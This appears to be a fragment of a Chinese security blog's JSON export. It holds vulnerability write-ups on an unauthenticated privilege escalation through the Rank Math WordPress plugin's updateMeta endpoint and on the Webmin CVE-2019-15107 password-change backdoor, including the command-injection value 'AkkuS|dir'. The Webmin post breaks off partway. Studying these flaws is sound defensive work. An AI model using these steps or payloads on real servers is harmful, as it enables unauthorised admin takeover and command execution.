src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142437-f285ead6-7faa-1.png\" alt=\"4e8777ce7736d41e89dc60c51fb10859.png\"></p>\n<p>接下来看一下$this-&gt;update_metadata方法，仍然是位于\\wp-content\\plugins\\seo-by-rank-math\\includes\\rest\\class-admin.php中。见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142454-fc7b3cda-7faa-1.png\" alt=\"2b09038ee7b7fc4bf4485395e487dc8d.png\"></p>\n<p>首先分析$this-&gt;update_metadata方法中传入的参数。见下图红框处</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142521-0c590bf0-7fab-1.png\" alt=\"c9aa3ac8a4bea18330c48e3fd2046b5d.png\"></p>\n<p>$this-&gt;update_metadata方法从请求的参数中获取objectID、objectType与meta三个参数，分别赋值给$object_id、$object_type与$meta</p>\n<p>接着从$meta取出键值对，并与$object_id、$object_type参数一同传递给update_metadata方法。如下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142546-1bb2ce10-7fab-1.png\" alt=\"40e68f1f1c8afe31db270e0d61712214.png\"></p>\n<p>我们具体分析一下上图中的update_metadata方法。update_metadata方法位于\\wp-includes\\meta.php文件中。见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142611-2a28fcc6-7fab-1.png\" alt=\"d66963aea399a33288c2f1d0ee7ff316.png\"></p>\n<p>update_metadata方法是wordpress中用来操作元数据的操作函数，其作用是更新指定对象的元数据。</p>\n<p>本次漏洞可以利用该update_metadata函数更新任意指定元数据。那不得不提一下wordpress元数据是什么</p>\n<h3 id=\"什么是元数据（Metadata）\"><a href=\"#什么是元数据（Metadata）\" class=\"headerlink\" title=\"什么是元数据（Metadata）\"></a>什么是元数据（Metadata）</h3><p>元数据可描述为关于数据的数据。通常元数据有如下两种：</p>\n<p><strong>1、结构化的元数据（Structural metadata）</strong>是有关数据结构的设计和说明，通常叫做“关于数据容器的数据（data about the containers of data）；</p>\n<p><strong>2、描述性的元数据（descriptive metadata）</strong>，关于应用程序数据和数据内容的单个实例。</p>\n<p>我们首先看下wordpress开发手册上关于元数据的解释：</p>\n<p>“元数据根据其定义，是有关信息的信息。<br>在WordPress的情况下，它是与帖子，用户，评论和条款相关的信息。”</p>\n<p>这里的定义不是很好理解，关于元数据，《深入理解 WordPress 元数据<br>(Metadata)》一文中进行了很详细的说明，下面节选其中一段关于元数据的说明片段：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142635-38a261ac-7fab-1.png\" alt=\"0dfe10e0b69628fca991153d2fe3affa.png\"></p>\n<p>想要更深入的了解，可以阅读下这篇文章，原文链接如下</p>\n<p><a href=\"https://www.wpzhiku.com/schedule-actions-wordpress-posts/\">https://www.wpzhiku.com/schedule-actions-wordpress-posts/</a></p>\n<p>简单来说，元数据就是数据的辅助表，对原始表单进行扩充。</p>\n<p>在WordPress 中有四种主要的内容类型，分别存储在四个数据表中：</p>\n<p>Posts、User、Comment、Link</p>\n<p>前三个都有分配给它们的元数据，存放于它们各自的元数据表中。WordPress中唯一没有元数据的对象类型（objecttype）是Link。</p>\n<p>WordPress使用3张表存储元数据：分别是wp_postmeta、wp_commentmeta与wp_usermeta</p>\n<p>wp_postmeta 存储关于posts的元数据（包括附件，导航菜单项和修改）。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142658-465ac8e8-7fab-1.png\" alt=\"a9ffad5ac725753f681082738f9ca171.png\"></p>\n<p>wp_commentmeta 存储关于评论（comments）的元数据。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142709-4d2cb9d8-7fab-1.png\" alt=\"d5c3fb558b07a0ca773ac17db07a2824.png\"></p>\n<p>wp_usermeta 存储关于用户的元数据。例如用户的level以及capabillities</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142724-55c2d14a-7fab-1.png\" alt=\"b8cad581847dbcc1893da3b3a6b1cc6e.png\"></p>\n<p>介绍完元数据，我们来看下upadte_metadata函数</p>\n<h3 id=\"upadte-metadata是什么\"><a href=\"#upadte-metadata是什么\" class=\"headerlink\" title=\"upadte_metadata是什么\"></a>upadte_metadata是什么</h3><p>WordPress提供如下函数对元数据进行操作</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142743-60fa5dda-7fab-1.png\" alt=\"f64927aad7286507ec477147a9f5686b.png\"></p>\n<p>我们随意跟进一个更新元数据的操作：update_user_meta()。如下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142756-68d0b784-7fab-1.png\" alt=\"1c9d6f7e16f8f2c0fd359e93c5f06e45.png\"></p>\n<p>上图可见，update_user_meta函数底层调用的是update_metadata函数进行更新操作。</p>\n<p>除了update_user_meta之外，update_post_meta以及update_comment_meta等更新操作底层调用的都是update_metadata。由此可见，update_metadata具有直接更新任意类型元数据的功能。</p>\n<p>利用Rank Math插件中注册的接口，未经身份验证的攻击者可以直接调用upadte_metadata，更新任意类型的元数据:例如wp_user_level以及wp_capabilities，这将导致攻击者可以将其订阅者权限的账号提权为管理员，或者将管理员的账号改为订阅者权限以限制管理员登陆。造成比较严重的危害。</p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>在分析完漏洞触发点以及漏洞之后，我们来看一下如何调用这个存在漏洞的自定义接口。首先我们查看下Wordpress中注册的接口信息。见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142818-75fbd088-7fab-1.png\" alt=\"37eec1da970f4b54b4fe1e21dde238f9.png\"></p>\n<p>上图红框处，即为存在漏洞的接口</p>\n<p>可见，接口url为<em><a href=\"http://127.0.0.1/wordpress/wp-json/rankmath/v1/updateMeta\">http://127.0.0.1/wordpress/wp-json/rankmath/v1/updateMeta</a></em> ,访问方式为POST请求</p>\n<p>现在攻击者拥有一个目标WordPress账户，名为kumamon，权限为订阅者。见下图红框处：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142850-89350520-7fab-1.png\" alt=\"76eb36def22d7813a351fe782a2a9f6e.png\"></p>\n<p>此时我们查看一下wp_usermeta表可以发现，攻击者拥有的账户在该表中的属性如下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142905-91e74ec6-7fab-1.png\" alt=\"36ad6a765bd3bbe9577cd2e9b38270d5.png\"></p>\n<p>如上图所示，第一个红框处的wp_user_level属性值为0。第二个红框处的wp_capabillities属性值为a:1:{s:10:”subscriber”;b:1;}</p>\n<p>再反观我们管理员admin账号</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142916-98a451be-7fab-1.png\" alt=\"03d46db68754346bc7a3ad45f693b64d.png\"></p>\n<p>可见wp_user_level属性值为10，而wp_capabillities属性值为a:1:{s:13:”administrator”;b:1;}</p>\n<p>因此我们可以通过调用接口，通过底层的update_metadata函数，将kumamon账号的wp_user_level与wp_capabillities属性值修改为与管理员账号相同值。</p>\n<p>想要构造利用payload，我们仍需要分析下接口的传参情况。见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142927-9f5d08fc-7fab-1.png\" alt=\"fe26f1dfdf497f1463c4d97316634d34.png\"></p>\n<p>上图红框处objectType参数很明显是user，meta参数是要修改的键值对，而objectID这里自然是对应的数据库表中的user_id字段了。但是攻击者账号kumamon对应的user_id是多少？如果不知道这个user_id，攻击者是无法精准的将自己控制的账号进行提权操作。</p>\n<p>经过分析发现，在个人资料的页面中包含此信息</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142940-a70560ae-7fab-1.png\" alt=\"764ec7d02e9fca5806fd923e9ab4f5c1.png\"></p>\n<p>该页面查看源码，即可看见当前用户userid的值，见下图红框处，值为4</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142952-ae4dc6d0-7fab-1.png\" alt=\"29727aa6692f4e9d49eaf81c0531f8bc.png\"></p>\n<p>因此构造数据包如下：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416143005-b6090fec-7fab-1.png\" alt=\"63f1944da613d10cb62f5e8d07a945c3.png\"></p>\n<p>当数据包发送完毕后，kumamon账号的权限随即变为管理员</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416143018-bd8eae7a-7fab-1.png\" alt=\"e0ecc2c2facf4b7e293564f748a09ca9.png\"></p>\n<h2 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h2><p>在1.0.41.2版本中，Rank Math已经对该漏洞进行修复。见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416143028-c3aa52b4-7fab-1.png\" alt=\"bc960eaeeb9a953a9cd8c89aa3f3d554.png\"></p>\n<p>Rank Math对存在漏洞的接口调用了get_object_permissions_check方法进行权限校验，从而避免了未经授权用户的攻击行为</p>\n<p>get_object_permissions_check方法也是1.0.41.2版本中新引进的，具体如下：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416143042-cc11abdc-7fab-1.png\" alt=\"842f8575b6cd6d64ca7ee7b0f49d2c52.png\"></p>\n<p>底层采用了WordPress 的current_user_can方法进行权限校验</p>"},{"title":"Webmin远程命令执行漏洞(CVE-2019-15107)深入分析","date":"2019-08-24T11:20:03.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n近日Webmin被发现一处远程命令执行漏洞，经过分析后，初步猜测其为一次**后门**植入事件。\n\nWebmin是目前功能最强大的基于Web的Unix系统管理工具。管理员通过浏览器访问Webmin的各种管理功能并完成相应的管理动作。据统计，互联网上大约有13w台机器使用Webmin。当用户开启Webmin密码重置功能后，攻击者可以通过发送POST请求在目标系统中执行任意命令，且无需身份验证。\n\n<!--more-->\n\n# **0x01 漏洞分析**\n* * *\n\n首先分析msf给出的插件\n\n[![0](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408261534_0.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408261534_0.png)\n\n&nbsp;\n\n根据插件，还原出poc如下：\n\n[![1](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408261950_1.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408261950_1.png)\n\n当poc执行后，回像password_change.cgi发送POST请求\n\n接下来看下password_change.cgi\n\n&nbsp;\n\n位于37行到188行处，存在if-else语句\n\n他们分别是\n\n1、if ($wuser)\n\n[![2](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408262214_2.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408262214_2.png)\n\n2、elsif ($gconfig{\\'passwd_cmd\\'})\n\n[![3](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408262869_3.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408262869_3.png)\n\n3、elsif ($in{\\'pam\\'})\n\n[![4](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040826311_4.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040826311_4.png)\n\n4、else\n\n[![5](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408263475_5.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408263475_5.png)\n\n&nbsp;\n\n我们需要确认，程序到底进入那个if分支了\n\n我们先print $wuser\n\n[![6](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408263891_6.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408263891_6.png)\n\n&nbsp;\n\n[![7](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264127_7.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264127_7.png)\n\n从上图打印结果看，wuser不为空，所以这里直接进入if ($wuser)分支\n\n在if ($wuser)分支中，首先执行encrypt_password方法，如下图红框处\n\n[![8](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264453_8.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264453_8.png)\n\nencrypt_password方法位于\\acl\\acl-lib.pl\n\n[![9](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264754_9.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264754_9.png)\n\n该方法的底层，调用了crypt方法，如下图，位于acl/md5-lib.pl中\n\n[![10](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265039_10.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265039_10.png)\n\n[![11](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265391_11.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265391_11.png)\n\n传入该crypt方法的第一个参数为$passwd\n\n&nbsp;\n\n打印此时passwd\n\n[![12](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265599_12.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265599_12.png)\n\n[![13](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040826581_13.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040826581_13.png)\n\n可见值为 AkkuS|dir，也就是POST请求中的old参数值\n\n&nbsp;\n\nencrypt_password底层调用crypt进行编码后，将计算值return,赋值给$enc,如下图\n\n[![14](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270184_14.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270184_14.png)\n\n&nbsp;\n\n由于我们传入的pass(AkkuS|dir)并不是root用户的密码，下图红框处的eq结果为false\n\n[![15](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270362_15.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270362_15.png)\n\n&nbsp;\n\n因此触发pass_error，系统需要把Failed to change password : The current password is incorrect这个信息反馈给用户\n\n[![16](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270668_16.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270668_16.png)\n\n但是注意上图红框处，在pass_error方法的传参中，$in{’old’}被 qx/ /包裹\n\n了解下qx/ /在perl中的用法：\n\n[![17](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270989_17.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270989_17.png)\n\nqx执行外部程序，相当于``\n\n也就是说，$in{’old’}的值会被执行。$in{’old’}就是POST中传入的old参数，可控，所以这里造成了任意代码执行漏洞。\n\n&nbsp;\n\n值得注意的是，POST中的old参数，是用户修改密码时所提交的旧密码。众所周知，密码是一个字符串，而非可执行代码，这里将传入的旧密码字符串拿来执行，并非正常业务逻辑所为。\n\n&nbsp;\n\n不仅如此，$in{‘old’}的值在被执行后，会拼接在$text{‘password_eold’}参数后面，一同传入pass_error中，如下图\n\n[![18](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040827126_18.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040827126_18.png)\n\n打印$text{‘password_eold’}，查看它的值\n\n[![19](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408271552_19.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408271552_19.png)\n\n[![20](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408271888_20.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408271888_20.png)\n\n当我们的$in{’old’}传入”AkkuS|dir”时，dir执行后的返回值会拼接到The current password is incorrect后，传入pass_error\n\n[![21](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272062_21.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272062_21.png)\n\n接着，在pass_error中被打印出来\n\n[![22](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904082723100_22.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904082723100_22.png)\n\n这里不仅仅将用户旧密码拿来执行，更是通过pass_error，把返回值直接打印到返回值中，更加落实了被植入后门的猜测\n\n&nbsp;\n\n对比官网\\ SourceForge\\github三个不同地方下载的Webmin代码发现，官网\\ SourceForge存在代码执行点，而github不存在\n\n1、官网与SourceForge：\n\n[![23](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272692_23.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272692_23.png)\n\n这里存在qx包裹的$in{‘old’}\n\n&nbsp;\n\n再来看github上下载的同版本Webmin代码\n\n[![24](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272931_24.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272931_24.png)\n\nPass_error中竟然没有被qx包裹的$in{‘old’}\n\n&nbsp;\n\n对比如下：\n\n[![25](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273256_25.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273256_25.png)\n\n也就是说，github上下载的Webmin不存在代码执行漏洞，而官网和SourceForge上却存在\n\n&nbsp;\n\n&nbsp;\n\n# **0x02 被植入后门依据**\n* * *\n\n1、 将用户提交的旧密码通过qx直接执行\n\n[![26](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273550_26.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273550_26.png)\n\n正常业务逻辑中旧密码为字符串，而非可执行代码，这里将密码字符串拿来直接执行，不符合逻辑\n\n&nbsp;\n\n2、 将执行结果通过报错打印到返回值中\n\n[![27](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273736_27.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273736_27.png)\n\n如果仅仅是执行代码，攻击者无法判断后台执行是否成功，以及无法得到执行成功后的返回值，例如”dir”、”ifconfig”这类指令，是需要看回显值得。因此，在这里通过pass_error将执行成功的返回值隐蔽的返回\n\n[![28](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274065_28.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274065_28.png)\n\n3、 官网\\ SourceForge代码中存在漏洞，github代码中无漏洞\n\n[![29](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274482_29.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274482_29.png)\n\n通过以上三点，初步猜测，Webmin代码被移植入后门\n\n&nbsp;\n\n&nbsp;\n\n# **0x03 POC无需管道符**\n* * *\n\n目前业界流传的poc，都是需要使用管道符 “|”的形式：\n\n例如msf给出的poc：”AkkuS|dir ”\n\n[![30](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274792_30.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274792_30.png)\n\n但是经过漏洞深入的分析发现，old中的值最终会被直接执行，因此并不需要管道符\n\n可以构造如下poc\n\n[![31](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040827514_31.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040827514_31.png)\n\n[![32](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408280362_32.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408280362_32.png)","source":"_posts/Webmin-RCE.md","raw":"---\ntitle: Webmin远程命令执行漏洞(CVE-2019-15107)深入分析\ndate: 2019-08-24 19:20:03\ntags: web漏洞分析\ncategories: 技术\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n近日Webmin被发现一处远程命令执行漏洞，经过分析后，初步猜测其为一次**后门**植入事件。\n\nWebmin是目前功能最强大的基于Web的Unix系统管理工具。管理员通过浏览器访问Webmin的各种管理功能并完成相应的管理动作。据统计，互联网上大约有13w台机器使用Webmin。当用户开启Webmin密码重置功能后，攻击者可以通过发送POST请求在目标系统中执行任意命令，且无需身份验证。\n\n<!--more-->\n\n# **0x01 漏洞分析**\n* * *\n\n首先分析msf给出的插件\n\n[![0](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408261534_0.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408261534_0.png)\n\n&nbsp;\n\n根据插件，还原出poc如下：\n\n[![1](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408261950_1.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408261950_1.png)\n\n当poc执行后，回像password_change.cgi发送POST请求\n\n接下来看下password_change.cgi\n\n&nbsp;\n\n位于37行到188行处，存在if-else语句\n\n他们分别是\n\n1、if ($wuser)\n\n[![2](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408262214_2.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408262214_2.png)\n\n2、elsif ($gconfig{\\'passwd_cmd\\'})\n\n[![3](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408262869_3.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408262869_3.png)\n\n3、elsif ($in{\\'pam\\'})\n\n[![4](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040826311_4.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040826311_4.png)\n\n4、else\n\n[![5](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408263475_5.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408263475_5.png)\n\n&nbsp;\n\n我们需要确认，程序到底进入那个if分支了\n\n我们先print $wuser\n\n[![6](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408263891_6.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408263891_6.png)\n\n&nbsp;\n\n[![7](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264127_7.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264127_7.png)\n\n从上图打印结果看，wuser不为空，所以这里直接进入if ($wuser)分支\n\n在if ($wuser)分支中，首先执行encrypt_password方法，如下图红框处\n\n[![8](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264453_8.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264453_8.png)\n\nencrypt_password方法位于\\acl\\acl-lib.pl\n\n[![9](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264754_9.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264754_9.png)\n\n该方法的底层，调用了crypt方法，如下图，位于acl/md5-lib.pl中\n\n[![10](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265039_10.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265039_10.png)\n\n[![11](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265391_11.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265391_11.png)\n\n传入该crypt方法的第一个参数为$passwd\n\n&nbsp;\n\n打印此时passwd\n\n[![12](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265599_12.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265599_12.png)\n\n[![13](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040826581_13.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040826581_13.png)\n\n可见值为 AkkuS|dir，也就是POST请求中的old参数值\n\n&nbsp;\n\nencrypt_password底层调用crypt进行编码后，将计算值return,赋值给$enc,如下图\n\n[![14](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270184_14.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270184_14.png)\n\n&nbsp;\n\n由于我们传入的pass(AkkuS|dir)并不是root用户的密码，下图红框处的eq结果为false\n\n[![15](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270362_15.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270362_15.png)\n\n&nbsp;\n\n因此触发pass_error，系统需要把Failed to change password : The current password is incorrect这个信息反馈给用户\n\n[![16](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270668_16.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270668_16.png)\n\n但是注意上图红框处，在pass_error方法的传参中，$in{’old’}被 qx/ /包裹\n\n了解下qx/ /在perl中的用法：\n\n[![17](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270989_17.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270989_17.png)\n\nqx执行外部程序，相当于``\n\n也就是说，$in{’old’}的值会被执行。$in{’old’}就是POST中传入的old参数，可控，所以这里造成了任意代码执行漏洞。\n\n&nbsp;\n\n值得注意的是，POST中的old参数，是用户修改密码时所提交的旧密码。众所周知，密码是一个字符串，而非可执行代码，这里将传入的旧密码字符串拿来执行，并非正常业务逻辑所为。\n\n&nbsp;\n\n不仅如此，$in{‘old’}的值在被执行后，会拼接在$text{‘password_eold’}参数后面，一同传入pass_error中，如下图\n\n[![18](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040827126_18.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040827126_18.png)\n\n打印$text{‘password_eold’}，查看它的值\n\n[![19](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408271552_19.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408271552_19.png)\n\n[![20](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408271888_20.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408271888_20.png)\n\n当我们的$in{’old’}传入”AkkuS|dir”时，dir执行后的返回值会拼接到The current password is incorrect后，传入pass_error\n\n[![21](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272062_21.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272062_21.png)\n\n接着，在pass_error中被打印出来\n\n[![22](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904082723100_22.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904082723100_22.png)\n\n这里不仅仅将用户旧密码拿来执行，更是通过pass_error，把返回值直接打印到返回值中，更加落实了被植入后门的猜测\n\n&nbsp;\n\n对比官网\\ SourceForge\\github三个不同地方下载的Webmin代码发现，官网\\ SourceForge存在代码执行点，而github不存在\n\n1、官网与SourceForge：\n\n[![23](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272692_23.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272692_23.png)\n\n这里存在qx包裹的$in{‘old’}\n\n&nbsp;\n\n再来看github上下载的同版本Webmin代码\n\n[![24](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272931_24.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272931_24.png)\n\nPass_error中竟然没有被qx包裹的$in{‘old’}\n\n&nbsp;\n\n对比如下：\n\n[![25](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273256_25.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273256_25.png)\n\n也就是说，github上下载的Webmin不存在代码执行漏洞，而官网和SourceForge上却存在\n\n&nbsp;\n\n&nbsp;\n\n# **0x02 被植入后门依据**\n* * *\n\n1、 将用户提交的旧密码通过qx直接执行\n\n[![26](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273550_26.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273550_26.png)\n\n正常业务逻辑中旧密码为字符串，而非可执行代码，这里将密码字符串拿来直接执行，不符合逻辑\n\n&nbsp;\n\n2、 将执行结果通过报错打印到返回值中\n\n[![27](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273736_27.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273736_27.png)\n\n如果仅仅是执行代码，攻击者无法判断后台执行是否成功，以及无法得到执行成功后的返回值，例如”dir”、”ifconfig”这类指令，是需要看回显值得。因此，在这里通过pass_error将执行成功的返回值隐蔽的返回\n\n[![28](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274065_28.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274065_28.png)\n\n3、 官网\\ 